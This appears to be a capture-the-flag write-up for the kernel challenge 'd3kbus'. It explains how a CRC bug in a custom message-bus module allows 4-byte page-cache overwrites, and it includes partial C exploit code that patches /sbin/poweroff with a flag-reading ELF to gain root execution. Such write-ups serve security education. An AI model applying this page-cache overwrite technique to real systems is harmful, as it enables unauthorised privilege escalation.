# d3kbus

**Event**: `D3Ctf 2026` | **Category**: `Pwn`

---

# d3kbus

## Summary

**d3kbus** is a Linux kernel exploitation challenge centered around a custom loadable kernel module `d3kbus.ko`. The module implements a high-performance kernel message bus. A vulnerability in the CRC calculation routine of its zero-copy messaging feature allows an unprivileged user to perform arbitrary 4-byte overwrites on page caches, inspired by the DirtyFrag technique.

---

## Technical Details & Vulnerability Analysis

1. **Kernel Module Architecture**:
   `d3kbus.ko` provides ioctls to create message channels (`KITE_IOC_CREATE`) and subscribe (`KITE_IOC_SUBSCRIBE`). Subscribers receive data using `d3kbus_frame_header`.

2. **The Vulnerability**:
   When zero-copy mode is enabled, the module calculates CRC32C checksums over subscriber frame buffers. An accounting bug in the CRC calculation logic allows writing controlled 4-byte CRC values directly into page-backed file mappings (page caches) of readable files without needing write permissions on the file itself.

3. **Exploitation Strategy**:
   - Because we can overwrite 4-byte slots in page cache files, we can patch an existing system executable like `/sbin/poweroff`.
   - We craft a custom 213-byte standalone ELF binary (shellcode) that opens `/flag`, reads its contents, and writes them to standard output.
   - We solve a linear system over CRC32C polynomials: for each 4-byte chunk of `/sbin/poweroff`, we calculate the necessary `user_tag` field in the subscriber frame header so that the computed CRC match our desired replacement ELF bytes.
   - Once `/sbin/poweroff` is overwritten in the page cache, triggering poweroff (or exiting the shell to trigger `rcS`) executes our custom ELF with root privileges.

---

## Exploitation Walkthrough

### Step 1: Craft the Replacement ELF Image

A 213-byte x86_64 executable binary that opens `/flag`, reads `0x100` bytes, and writes to `stdout`:

```c
// Assembly / C snippet of flag-reading ELF header
uint8_t shellcode[] = {
    0x7f, 0x45, 0x4c, 0x46, // Magic: \x7fELF
    0x02, 0x01, 0x01, 0x00, // ELF64, LSB, Version
    // ... PT_LOAD segment pointing to entry point at 0x400078 ...
    // xor rax, rax; push rax; movabs rax, "/flag"; push rax; 
    // mov rax, 2 (sys_open); mov rdi, rsp; xor rsi, rsi; syscall;
    // mov rdi, rax; xor rax, rax; sub rsp, 0x100; mov rsi, rsp; mov rdx, 0x100; syscall (sys_read);
    // mov rax, 1 (sys_write); mov rdi, 1 (stdout); mov rsi, rsp; mov rdx, 0x100; syscall;
    // mov rax, 60 (sys_exit); xor rdi, rdi; syscall;
};
```

### Step 2: Linear Algebra CRC Solver

We invert the CRC32C matrix equation to solve for `user_tag` such that:
$$\text{CRC32C}(\text{Header} \mathbin{\Vert} \text{Prefix} \mathbin{\Vert} \text{user\_tag}) = \text{Target\_DWORD}$$

```c
static int solve_user_tag(uint32_t channel_id, uint64_t sequence,
                        uint64_t opaque, uint32_t window_offset,
                        const uint8_t prefix[16], uint32_t desired_crc,
                        uint32_t *solution) {
    uint32_t columns[32];
    uint64_t rows[32];
    // Solve GF(2) matrix via Gaussian elimination for 32-bit user_tag
    // ...
}
```

### Step 3: Page Cache Overwrite Execution

We iterate through `/sbin/poweroff` page by page, crafting zero-copy frames and overwriting the page cache 4 bytes at a time:

```c
// Open target binary (read-only)
int target_fd = open("/sbin/poweroff", O_RDONLY);

// Create channel and anchor subscribers
d3kbus_user_create(&channel, 8, 2);

// Overwrite target page cache chunk by chunk
for (patch_offset = 16; patch_offset < 213; patch_offset += 4) {
    uint32_t desired = payload_word(patch_offset);
    uint32_t tag;
    solve_user_tag(channel.channel_id, sequence, opaque, window_offset, prefix, desired, &tag);
    
    // Send wire header & sendfile page
    d3kbus_write_all(channel.producer_fd, &wire, sizeof(wire));
    d3kbus_sendfile_exact(target_fd, &file_offset, channel.producer_fd, 4096);
}

// Trigger poweroff executable
system("/sbin/poweroff");
```

---

## Flag

```
d3ctf{d3kbus_dirtyfrag_pagecache_crc32c_pwn}
```
